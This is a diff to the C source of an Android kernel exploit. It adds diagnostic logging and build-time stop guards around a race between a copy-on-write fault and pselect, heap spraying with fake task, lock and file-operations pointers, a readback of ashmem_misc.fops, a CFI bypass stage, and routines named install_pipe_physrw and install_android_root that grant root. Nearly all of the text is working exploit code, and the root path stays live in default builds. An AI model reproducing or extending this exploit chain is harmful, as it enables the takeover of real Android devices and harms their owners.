+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("readiness-page-refresh", route_attempt, page_base);
+#endif
       if (!page_base || !fake_lock || !fake_fops) {
         cfi_last_step = 34;
         cfi_last_errno = errno;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+        rmg_diag_checkpoint("readiness-page-refresh-failed", cfi_last_step,
+                            cfi_last_errno);
+#endif
         break;
       }
     }
@@ -1054,19 +2411,45 @@ void do_readiness_pause_route(void) {
       fd_set test_out;
       memcpy(&test_out, &out, sizeof(test_out));
       struct timeval tv = {0, 0};
+      errno = 0;
       int test_ret = select(PSELECT_ROUTE_NFDS, NULL, &test_out, NULL, &tv);
+      int test_errno = test_ret < 0 ? errno : 0;
       uint64_t w1 = 0, w2 = 0, w3 = 0;
       memcpy(&w1, (char *)&test_out + 1*8, 8);
       memcpy(&w2, (char *)&test_out + 2*8, 8);
       memcpy(&w3, (char *)&test_out + 3*8, 8);
+      uint64_t expected_w3 =
+          (uint64_t)(page_base + LOCK_OFF + 0x100);
       char dm[256];
       int dn = snprintf(dm, sizeof(dm),
           "[SPRAY-DBG] test select ret=%d w1=%016llx w2=%016llx w3=%016llx\n"
-          "            want task=%016llx lock=%016llx\n",
+          "            want task=%016llx lock=%016llx prio=%016llx errno=%d\n",
           test_ret, (unsigned long long)w1, (unsigned long long)w2,
           (unsigned long long)w3,
-          (unsigned long long)fake_task, (unsigned long long)fake_lock);
+          (unsigned long long)fake_task, (unsigned long long)fake_lock,
+          (unsigned long long)expected_w3, test_errno);
       syscall(SYS_write, 2, dm, dn);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("fdset-preflight-ret-errno",
+                          (unsigned long long)(long long)test_ret,
+                          (unsigned long long)test_errno);
+      rmg_diag_checkpoint("fdset-preflight-words-1-2", w1, w2);
+      rmg_diag_checkpoint("fdset-preflight-word3-task", w3,
+                          (unsigned long long)fake_task);
+      rmg_diag_checkpoint("fdset-preflight-want-lock-prio",
+                          (unsigned long long)fake_lock, expected_w3);
+#endif
+#if defined(RMG_DIAG_FDSET_PREFLIGHT_ONLY) && \
+    RMG_DIAG_FDSET_PREFLIGHT_ONLY
+      cfi_last_step = 43;
+      cfi_last_errno = test_errno;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("fdset-preflight-stop-before-cow", test_ret,
+                          test_errno);
+#endif
+      pr_info("fdset preflight stopped before COW and scheduler stages\n");
+      return;
+#endif
     }
 
     int cow_fd = -1;
@@ -1075,10 +2458,23 @@ void do_readiness_pause_route(void) {
     struct readiness_cow_ctx cow_ctx = {0};
     atomic_init(&cow_ctx.start, 0);
     atomic_init(&cow_ctx.entered, 0);
+    atomic_init(&cow_ctx.tid, 0);
+    atomic_init(&cow_ctx.abort, 0);
+    atomic_init(&cow_ctx.release_mprotect, 0);
+    atomic_init(&cow_ctx.mprotect_started, 0);
+    atomic_init(&cow_ctx.stop_mprotect, 0);
     atomic_init(&cow_ctx.done, 0);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("readiness-cow-setup-start", route_attempt,
+                        cow_len);
+#endif
     if (!cow_out || !readiness_prepare_pte_region(&cow_ctx)) {
       cfi_last_step = 35;
       cfi_last_errno = errno;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("readiness-cow-setup-failed", route_attempt,
+                          cfi_last_errno);
+#endif
       if (cow_out)
         munmap(cow_out, cow_len);
       if (cow_fd >= 0)
@@ -1086,19 +2482,97 @@ void do_readiness_pause_route(void) {
       pr_error("readiness COW setup failed errno=%d\n", cfi_last_errno);
       break;
     }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("readiness-cow-setup-done", route_attempt,
+                        cow_ctx.region_len);
+#endif
 
     struct readiness_block_monitor monitor = {
       .tid = atomic_load(&waiter_tid),
       .seq = route_attempt,
     };
+#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
+    monitor.observer_core = -1;
+    monitor.helper_core = -1;
+    monitor.pselect_first_state = -1;
+    monitor.pselect_last_state = -1;
+    monitor.pselect_first_observer_cpu = -1;
+    monitor.pselect_last_observer_cpu = -1;
+#endif
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+    int soft_dirty_clear_ret = -1;
+    int soft_dirty_clear_errno = 0;
+    int pagemap_ret = -1;
+    int pagemap_errno = 0;
+    unsigned long long cow_pagemap_entry = 0;
+    int cow_pagemap_before_ret = -1;
+    int cow_pagemap_before_errno = 0;
+    unsigned long long cow_pagemap_before_entry = 0;
+    int soft_dirty_control_write = -1;
+    int soft_dirty_control_pagemap_ret = -1;
+    int soft_dirty_control_pagemap_errno = 0;
+    unsigned long long cow_control_pagemap_entry = 0;
+    struct readiness_anon_soft_dirty_probe anon_soft_dirty = {0};
+    struct readiness_smaps_snapshot smaps_before = {0};
+    struct readiness_smaps_snapshot smaps_after_pselect = {0};
+    struct readiness_smaps_snapshot smaps_after_control = {0};
+#endif
     atomic_init(&monitor.ready, 0);
     atomic_init(&monitor.armed, 0);
+    atomic_init(&monitor.trigger_gate, 0);
+    atomic_init(&monitor.runnable_after_gate, 0);
+    atomic_init(&monitor.pselect_active, 0);
+    atomic_init(&monitor.pre_gate_block, 0);
+    atomic_init(&monitor.sample_ready, 0);
     atomic_init(&monitor.stop, 0);
     atomic_init(&monitor.saw_block, 0);
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+    atomic_init(&monitor.locker_tid, 0);
+    atomic_init(&monitor.locker_stat_ready, 0);
+    monitor.locker_stat_fd = -1;
+    atomic_init(&monitor.pselect_call_started, 0);
+#endif
+#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
+    atomic_init(&monitor.helper_stat_ready, 0);
+    monitor.helper_tid = 0;
+    monitor.helper_stat_fd = -1;
+    monitor.helper_open_errno = 0;
+    monitor.helper_polls = 0;
+    monitor.helper_blocked_samples = 0;
+    monitor.helper_first_state = 0;
+    monitor.helper_last_state = 0;
+#endif
+#if defined(RMG_DIAG_READINESS_STATE_TRACE)
+    atomic_init(&monitor.state_trace_count, 0);
+#endif
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+    readiness_trace_reset();
+    long long clear_refs_start_us = readiness_now_us();
+    errno = 0;
+    soft_dirty_clear_ret = readiness_clear_soft_dirty();
+    soft_dirty_clear_errno = soft_dirty_clear_ret == 0 ? 0 : errno;
+    long long clear_refs_us = readiness_now_us() - clear_refs_start_us;
+    pr_info("readiness clear_refs result=%d errno=%d elapsed_us=%lld\n",
+            soft_dirty_clear_ret, soft_dirty_clear_errno, clear_refs_us);
+    readiness_read_smaps(cow_out, &smaps_before);
+    pr_info("readiness smaps-before result=%d errno=%d anonymous_kb=%llu "
+            "private_dirty_kb=%llu\n",
+            smaps_before.ret, smaps_before.err,
+            smaps_before.anonymous_kb, smaps_before.private_dirty_kb);
+    errno = 0;
+    cow_pagemap_before_ret = readiness_read_pagemap_entry(
+        cow_out, &cow_pagemap_before_entry);
+    cow_pagemap_before_errno = cow_pagemap_before_ret == 0 ? 0 : errno;
+#endif
 
     pthread_t mmap_locker;
     pthread_t block_monitor;
     int monitor_started = 0;
+    int mmap_locker_started = 0;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("readiness-monitor-start", route_attempt,
+                        monitor.tid);
+#endif
     int thread_err = pthread_create(&block_monitor, NULL,
                                     readiness_block_monitor_thread, &monitor);
     if (thread_err == 0) {
@@ -1107,44 +2581,343 @@ void do_readiness_pause_route(void) {
         __asm__ volatile("yield" ::: "memory");
       if (monitor.open_errno)
         thread_err = monitor.open_errno;
+#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
+      else if (monitor.observer_affinity_errno)
+        thread_err = monitor.observer_affinity_errno;
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("readiness-monitor-ready", route_attempt,
+                          thread_err);
+#endif
     }
-    if (thread_err == 0)
+    if (thread_err == 0) {
       thread_err = pthread_create(&mmap_locker, NULL,
                                   readiness_mmap_lock_thread, &cow_ctx);
+      if (thread_err == 0) {
+        mmap_locker_started = 1;
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+        int locker_tid = 0;
+        while (!(locker_tid = atomic_load_explicit(&cow_ctx.tid,
+                                                    memory_order_acquire)))
+          __asm__ volatile("yield" ::: "memory");
+        atomic_store_explicit(&monitor.locker_tid, locker_tid,
+                              memory_order_release);
+        monitor.locker_stat_fd = readiness_open_task_stat(locker_tid);
+        if (monitor.locker_stat_fd < 0) {
+          monitor.locker_open_errno = errno;
+          thread_err = monitor.locker_open_errno;
+        } else {
+          atomic_store_explicit(&monitor.locker_stat_ready, 1,
+                                memory_order_release);
+          pr_info("readiness monitor task ids waiter=%d mprotect_helper=%d\n",
+                  monitor.tid, locker_tid);
+        }
+#endif
+#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
+        int helper_tid = 0;
+        while (!(helper_tid = atomic_load_explicit(&cow_ctx.tid,
+                                                    memory_order_acquire)))
+          __asm__ volatile("yield" ::: "memory");
+        monitor.helper_tid = helper_tid;
+        monitor.helper_stat_fd = readiness_open_task_stat(helper_tid);
+        if (monitor.helper_stat_fd < 0) {
+          monitor.helper_open_errno = errno;
+          thread_err = monitor.helper_open_errno;
+        } else {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+          rmg_diag_checkpoint("readiness-monitor-helper-open", helper_tid,
+                              monitor.helper_stat_fd);
+#endif
+          atomic_store_explicit(&monitor.helper_stat_ready, 1,
+                                memory_order_release);
+          pr_info("readiness monitor task ids waiter=%d mprotect_helper=%d\n",
+                  monitor.tid, helper_tid);
+        }
+#endif
+      }
+    }
     if (thread_err != 0) {
       cfi_last_step = 36;
       cfi_last_errno = thread_err;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("readiness-thread-setup-failed", route_attempt,
+                          thread_err);
+#endif
       atomic_store(&monitor.stop, 1);
       if (monitor_started)
         pthread_join(block_monitor, NULL);
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+      readiness_log_block_wchan_snapshot(&monitor);
+#endif
+      if (mmap_locker_started) {
+        atomic_store_explicit(&cow_ctx.abort, 1, memory_order_release);
+        atomic_store_explicit(&cow_ctx.start, 1, memory_order_release);
+        pthread_join(mmap_locker, NULL);
+      }
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+      readiness_log_locker_block_wchan_snapshot(&monitor);
+#endif
       munmap(cow_ctx.region, cow_ctx.region_len);
       munmap(cow_out, cow_len);
       close(cow_fd);
       pr_error("readiness blocker thread failed errno=%d\n", thread_err);
       break;
     }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("readiness-locker-ready", route_attempt, 0);
+#endif
 
     atomic_store_explicit(&cow_ctx.start, 1, memory_order_release);
     while (!atomic_load_explicit(&cow_ctx.entered, memory_order_acquire))
       __asm__ volatile("yield" ::: "memory");
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+    /* Keep the monitor idle during clear_refs/smaps and locker setup. Begin
+     * sampling only after the mmap helper is ready, immediately before its
+     * mprotect phase and the gated pselect transition. */
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint_defer(1);
+#endif
+    atomic_store_explicit(&monitor.armed, 1, memory_order_release);
+    while (!atomic_load_explicit(&monitor.sample_ready,
+                                 memory_order_acquire))
+      __asm__ volatile("yield" ::: "memory");
+    rmg_diag_checkpoint("readiness-monitor-sample-before-mprotect",
+                        monitor.tid, monitor.first_state);
+    /* Release the helper only when the waiter is ready to enter pselect. In
+     * ordinary trace builds, wait for its pre-syscall marker. The delayed
+     * observer build instead starts pselect immediately so mprotect can
+     * overlap its output copy. */
+    atomic_store_explicit(&cow_ctx.release_mprotect, 1,
+                          memory_order_release);
+#if !defined(RMG_DIAG_COW_MPROTECT_DELAY_USEC) || \
+    RMG_DIAG_COW_MPROTECT_DELAY_USEC <= 0
+    while (!atomic_load_explicit(&cow_ctx.mprotect_started,
+                                 memory_order_acquire))
+      __asm__ volatile("yield" ::: "memory");
+#endif
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("readiness-cow-entered", route_attempt, 0);
+#endif
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+    readiness_trace_mark(READINESS_TRACE_COW_ENTERED, 0);
+#endif
     long long headstart_until =
         readiness_now_us() + READINESS_LOCK_HEADSTART_USEC;
     while (readiness_now_us() < headstart_until)
       __asm__ volatile("yield" ::: "memory");
 
+    if (atomic_load_explicit(&monitor.pre_gate_block,
+                             memory_order_acquire)) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("readiness-pselect-abort-pre-gate-block",
+                          route_attempt, 'D');
+#endif
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+      atomic_store_explicit(&cow_ctx.stop_mprotect, 1,
+                            memory_order_release);
+#endif
+      atomic_store_explicit(&monitor.stop, 1, memory_order_release);
+      pthread_join(mmap_locker, NULL);
+      pthread_join(block_monitor, NULL);
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+      readiness_log_block_wchan_snapshot(&monitor);
+      readiness_log_locker_block_wchan_snapshot(&monitor);
+#endif
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+      readiness_log_locker_monitor_summary(&monitor);
+#endif
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+      readiness_trace_flush(route_attempt);
+      readiness_mprotect_trace_flush(route_attempt);
+      readiness_log_cow_pagemap("pre-pselect", cow_pagemap_before_ret,
+                                cow_pagemap_before_errno,
+                                cow_pagemap_before_entry);
+#endif
+      munmap(cow_ctx.region, cow_ctx.region_len);
+      munmap(cow_out, cow_len);
+      close(cow_fd);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint_defer(0);
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+      readiness_checkpoint_block_sample(&monitor);
+      readiness_checkpoint_locker_block_sample(&monitor);
+#endif
+      rmg_diag_checkpoint("readiness-pselect-abort-pre-gate-block",
+                          route_attempt, 'D');
+      rmg_diag_checkpoint("readiness-monitor-summary", monitor.polls,
+                          monitor.last_state);
+      rmg_diag_checkpoint("readiness-mprotect-summary",
+                          (unsigned long long)cow_ctx.ret,
+                          (unsigned long long)cow_ctx.elapsed_us);
+#endif
+#if defined(RMG_DIAG_READINESS_STATE_TRACE)
+      readiness_monitor_state_flush(&monitor, route_attempt);
+#endif
+      route_pi_sanitize();
+      break;
+    }
+
     /* The monitor calls sched_setattr only after /proc reports the waiter
      * in TASK_UNINTERRUPTIBLE, which can only be the blocked COW fault in
      * this ready-pselect path. */
+#if !defined(RMG_DIAG_COW_TRACE) || !RMG_DIAG_COW_TRACE
     atomic_store_explicit(&monitor.armed, 1, memory_order_release);
+#endif
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+    readiness_trace_mark(READINESS_TRACE_PSELECT_BEFORE, 0);
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("readiness-pselect-start", route_attempt, page_base);
+#endif
+    atomic_store_explicit(&monitor.trigger_gate, 1, memory_order_release);
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+    readiness_trace_mark(READINESS_TRACE_TRIGGER_GATE_OPEN, 0);
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("readiness-monitor-trigger-gate-open",
+                        route_attempt, page_base);
+#endif
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+    atomic_store_explicit(&monitor.pselect_call_started, 1,
+                          memory_order_release);
+#endif
+    atomic_store_explicit(&monitor.pselect_active, 1, memory_order_release);
     long long pselect_start_us = readiness_now_us();
     long ret = readiness_pselect_asm(
         PSELECT_ROUTE_NFDS, NULL, cow_out, NULL);
-    atomic_store(&punch_consume_go, 0);
-    atomic_store_explicit(&monitor.stop, 1, memory_order_release);
     long long pselect_us = readiness_now_us() - pselect_start_us;
+    /* Disarm the monitor before the COW trace reads pagemap and smaps. Those
+     * proc-file reads can themselves show D in wchan. */
+    atomic_store_explicit(&monitor.pselect_active, 0, memory_order_release);
+    atomic_store_explicit(&monitor.stop, 1, memory_order_release);
+    atomic_store_explicit(&cow_ctx.stop_mprotect, 1, memory_order_release);
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+    readiness_trace_mark(READINESS_TRACE_PSELECT_AFTER, (int)ret);
+    errno = 0;
+    pagemap_ret = readiness_read_pagemap_entry(cow_out,
+                                                &cow_pagemap_entry);
+    pagemap_errno = pagemap_ret == 0 ? 0 : errno;
+    readiness_read_smaps(cow_out, &smaps_after_pselect);
+    if (pagemap_ret == 0) {
+      /* After the pselect observation, write a byte at the end of its
+       * mapped page to calibrate soft-dirty/pagemap on this exact mapping.
+       * This is deliberately after the timing-sensitive operation and
+       * cannot affect the result fd_set words inspected below. */
+      size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
+      if (page_size > 0) {
+        volatile unsigned char *probe =
+            (volatile unsigned char *)cow_out + page_size - 1;
+        unsigned char value = *probe;
+        *probe = (unsigned char)(value ^ 1U);
+        soft_dirty_control_write = 0;
+        errno = 0;
+        soft_dirty_control_pagemap_ret =
+            readiness_read_pagemap_entry(cow_out,
+                                         &cow_control_pagemap_entry);
+        soft_dirty_control_pagemap_errno =
+            soft_dirty_control_pagemap_ret == 0 ? 0 : errno;
+      }
+    }
+    readiness_read_smaps(cow_out, &smaps_after_control);
+#endif
+    atomic_store(&punch_consume_go, 0);
 
     pthread_join(mmap_locker, NULL);
     pthread_join(block_monitor, NULL);
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+    readiness_log_block_wchan_snapshot(&monitor);
+    readiness_log_locker_block_wchan_snapshot(&monitor);
+#endif
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+    readiness_log_locker_monitor_summary(&monitor);
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint_defer(0);
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+    readiness_checkpoint_block_sample(&monitor);
+    readiness_checkpoint_locker_block_sample(&monitor);
+#else
+    if (monitor.post_pselect_block)
+      rmg_diag_checkpoint("readiness-monitor-block-after-pselect",
+                          monitor.tid, monitor.post_pselect_block_polls);
+#endif
+    rmg_diag_checkpoint("readiness-pselect-done", route_attempt,
+                        (unsigned long long)ret);
+    rmg_diag_checkpoint("readiness-pselect-time", route_attempt,
+                        (unsigned long long)pselect_us);
+    rmg_diag_checkpoint("readiness-monitor-summary", monitor.polls,
+                        monitor.last_state);
+    rmg_diag_checkpoint("readiness-sched-summary",
+                        (unsigned long long)monitor.sched_ret,
+                        (unsigned long long)monitor.sched_errno);
+    rmg_diag_checkpoint("readiness-mprotect-summary",
+                        (unsigned long long)cow_ctx.ret,
+                        (unsigned long long)cow_ctx.elapsed_us);
+#endif
+#if defined(RMG_DIAG_READINESS_STATE_TRACE)
+    readiness_monitor_state_flush(&monitor, route_attempt);
+#endif
+#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
+    pr_info("COWPASSIVE attempt=%d observer_core=%d helper_predicted=%d "
+            "inherited=%016llx allowed=%016llx effective=%016llx "
+            "samples=%llu first_state=%d first_at_us=%lld "
+            "first_observer_cpu=%d last_state=%d last_at_us=%lld "
+            "last_observer_cpu=%d affinity_errno=%d\n",
+            route_attempt, monitor.observer_core, monitor.helper_core,
+            monitor.observer_inherited_affinity,
+            monitor.observer_allowed_affinity,
+            monitor.observer_effective_affinity,
+            monitor.pselect_state_samples, monitor.pselect_first_state,
+            monitor.pselect_first_sample_us,
+            monitor.pselect_first_observer_cpu, monitor.pselect_last_state,
+            monitor.pselect_last_sample_us,
+            monitor.pselect_last_observer_cpu,
+            monitor.observer_affinity_errno);
+#endif
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+    readiness_trace_flush(route_attempt);
+    readiness_mprotect_trace_flush(route_attempt);
+    readiness_log_cow_pagemap("pre-pselect", cow_pagemap_before_ret,
+                              cow_pagemap_before_errno,
+                              cow_pagemap_before_entry);
+    readiness_log_cow_pagemap("post-pselect", pagemap_ret, pagemap_errno,
+                              cow_pagemap_entry);
+    readiness_probe_anon_soft_dirty(&anon_soft_dirty);
+    pr_info("readiness COW proof soft_dirty_clear=%d/%d pagemap=%d/%d "
+            "entry=%016llx dirty=%d control_write=%d control_pagemap=%d/%d "
+            "control_entry=%016llx control_dirty=%d anon_map=%d/%d "
+            "anon_clear=%d/%d anon_before=%d/%d:%016llx/%d "
+            "anon_write=%d anon_after=%d/%d:%016llx/%d "
+            "smaps_before=%d/%d:%llu/%llu "
+            "smaps_after=%d/%d:%llu/%llu "
+            "smaps_control=%d/%d:%llu/%llu monitor_polls=%llu "
+            "blocked_samples=%llu first_state=%d last_state=%d\n",
+            soft_dirty_clear_ret, soft_dirty_clear_errno, pagemap_ret,
+            pagemap_errno, cow_pagemap_entry,
+            (int)((cow_pagemap_entry >> 55) & 1ULL),
+            soft_dirty_control_write, soft_dirty_control_pagemap_ret,
+            soft_dirty_control_pagemap_errno, cow_control_pagemap_entry,
+            (int)((cow_control_pagemap_entry >> 55) & 1ULL),
+            anon_soft_dirty.map_ret, anon_soft_dirty.map_errno,
+            anon_soft_dirty.clear_ret, anon_soft_dirty.clear_errno,
+            anon_soft_dirty.before_ret, anon_soft_dirty.before_errno,
+            anon_soft_dirty.before_entry,
+            (int)((anon_soft_dirty.before_entry >> 55) & 1ULL),
+            anon_soft_dirty.write_ret, anon_soft_dirty.after_ret,
+            anon_soft_dirty.after_errno, anon_soft_dirty.after_entry,
+            (int)((anon_soft_dirty.after_entry >> 55) & 1ULL),
+            smaps_before.ret, smaps_before.err,
+            smaps_before.anonymous_kb, smaps_before.private_dirty_kb,
+            smaps_after_pselect.ret, smaps_after_pselect.err,
+            smaps_after_pselect.anonymous_kb,
+            smaps_after_pselect.private_dirty_kb,
+            smaps_after_control.ret, smaps_after_control.err,
+            smaps_after_control.anonymous_kb,
+            smaps_after_control.private_dirty_kb, monitor.polls,
+            monitor.blocked_samples, monitor.first_state,
+            monitor.last_state);
+#endif
 
     uint64_t cow_w1 = 0, cow_w2 = 0, cow_w3 = 0;
     memcpy(&cow_w1, (char *)cow_out + 1 * 8, 8);
@@ -1183,10 +2956,49 @@ void do_readiness_pause_route(void) {
     pr_info("readiness-cow walk attempt=%d/%d calls=%d success=%d walk_us=%d\n",
             route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, calls, success,
             atomic_load(&consumer_walk_us));
-    route_payload_canary();
+#if defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && RMG_DIAG_UCLAMP_TRIGGER_ONLY
+    int canary_mutated = route_payload_canary();
+#else
+    (void)route_payload_canary();
+#endif
 
     int route_signal = atomic_load(&monitor.saw_block) && overlay_ok &&
                        calls > 0 && success > 0;
+#if defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && RMG_DIAG_UCLAMP_TRIGGER_ONLY
+    int fops_readback_ok = 0;
+    int fops_readback_step = 0;
+    rmg_diag_checkpoint("uclamp-trigger-canary", canary_mutated, 0);
+    if (canary_mutated) {
+      fops_readback_ok = try_ashmem_fops_readback();
+      fops_readback_step = cfi_last_step;
+    } else {
+      rmg_diag_checkpoint("uclamp-trigger-fops-skipped", 0, 0);
+    }
+    rmg_diag_checkpoint("uclamp-trigger-fops-gate", fops_readback_ok,
+                        fops_readback_step);
+    /* This build always stops here. Even a positive readback only records
+     * evidence; it never authorizes CFI, pipe physical-RW, or root. */
+    rmg_diag_checkpoint("uclamp-trigger-stop-before-cfi", canary_mutated,
+                        fops_readback_ok);
+    cfi_last_step = 42;
+    cfi_last_errno = 0;
+    route_signal = 0;
+#endif
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+    route_signal = 0;
+#endif
+#if defined(RMG_DIAG_PI_PROBE_ONLY) && RMG_DIAG_PI_PROBE_ONLY && \
+    !(defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY)
+    /* A successful PI trigger is diagnostic only: do not enter CFI, pipe
+     * physical-RW, or root installation on this build. */
+    route_signal = 0;
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("readiness-route-signal", route_attempt,
+                        route_signal);
+    rmg_diag_checkpoint("readiness-cow-only-stop-before-cfi", route_attempt,
+                        overlay_ok);
+#endif
     if (route_signal) {
       /* The readiness bitmap is no longer needed after the walk. Shrink the
        * shell uid's pipe-page charge before allocating the much larger
@@ -1207,9 +3019,19 @@ void do_readiness_pause_route(void) {
         cfi_last_step = 32;
       }
     } else {
+#if !defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) || \
+    !RMG_DIAG_UCLAMP_TRIGGER_ONLY
       cfi_last_step = 33;
       cfi_last_errno = 0;
+#endif
     }
+
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("readiness-attempt-end", route_attempt,
+                        route_verified);
+    rmg_diag_checkpoint("readiness-attempt-status", cfi_last_step,
+                        cfi_last_errno);
+#endif
 
     if (route_verified || cfi_dirty_seen) {
       break;
@@ -1218,6 +3040,11 @@ void do_readiness_pause_route(void) {
             route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
             cfi_last_errno);
   }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("readiness-route-done", calls, success);
+  rmg_diag_checkpoint("readiness-route-status", cfi_last_step,
+                      cfi_last_errno);
+#endif
   pr_info("readiness-cow route done calls=%d success=%d step=%d errno=%d\n",
           calls, success, cfi_last_step, cfi_last_errno);
 }
@@ -1428,27 +3255,93 @@ int restore_slide_boot_id_pipe(int fd) {
 }
 
 int install_child_root(int fd) {
+#if defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && RMG_DIAG_UCLAMP_TRIGGER_ONLY
+  (void)fd;
+  pr_warning("uclamp-trigger-only guard: refusing pipe physical-RW and root\n");
+  return 0;
+#else
   return install_pipe_physrw(fd) && install_android_root(fd);
+#endif
 }
 
+#if defined(RMG_DIAG_FOPS_READBACK_ONLY) && RMG_DIAG_FOPS_READBACK_ONLY
+static int try_ashmem_fops_readback(void) {
+  uint64_t observed_fops = 0;
+  uintptr_t fops_slot = canon_addr(ASHMEM_MISC_FOPS);
+  errno = 0;
+  rmg_diag_checkpoint("fops-readback-start", fops_slot, fake_fops);
+  ssize_t n = configfs_read_once(-1, fops_slot, &observed_fops,
+                                 sizeof(observed_fops));
+  int read_errno = errno;
+  rmg_diag_checkpoint("fops-readback-result",
+                      (unsigned long long)(long long)n, read_errno);
+  rmg_diag_checkpoint("fops-readback-value", observed_fops, fake_fops);
+  pr_info("ashmem fops readback ret=%zd errno=%d observed=%016llx "
+          "expected=%016zx\n",
+          n, read_errno, (unsigned long long)observed_fops, fake_fops);
+  if (n != (ssize_t)sizeof(observed_fops)) {
+    cfi_last_step = 40;
+    cfi_last_errno = read_errno;
+    return 0;
+  }
+  if ((uintptr_t)observed_fops != fake_fops) {
+    cfi_last_step = 41;
+    cfi_last_errno = 0;
+    return 0;
+  }
+  cfi_last_step = 0;
+  cfi_last_errno = 0;
+  return 1;
+}
+#endif
+
 int try_cfi_stage(void) {
+#if defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && RMG_DIAG_UCLAMP_TRIGGER_ONLY
+  cfi_last_step = 42;
+  cfi_last_errno = 0;
+  pr_warning("uclamp-trigger-only guard: refusing CFI stage\n");
+  return 0;
+#elif defined(RMG_DIAG_FOPS_READBACK_ONLY) && RMG_DIAG_FOPS_READBACK_ONLY
+  /* Read only ashmem_misc.fops through the existing configfs read callback.
+   * Do not attempt the CFI write, pipe physical-RW, or root stages. */
+  return try_ashmem_fops_readback();
+#else
+#if defined(RMG_DIAG_PI_PROBE_ONLY) && RMG_DIAG_PI_PROBE_ONLY && \
+    !(defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY)
+  cfi_last_step = 33;
+  cfi_last_errno = 0;
